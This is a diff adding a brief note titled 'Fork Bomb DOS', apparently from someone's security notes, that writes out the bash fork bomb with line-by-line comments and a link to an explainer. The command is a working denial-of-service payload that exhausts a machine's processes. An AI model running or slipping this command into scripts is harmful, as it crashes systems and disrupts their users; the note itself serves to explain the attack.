@@ -1,0 +1,8 @@
+1. Fork Bomb DOS
+
+1. Fork Bomb DOS
+
+:(){   # Creating the function
+ :|:&  # REcursion calling itself and piping to itself
+};:    # Reboot required to resolve
+https://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
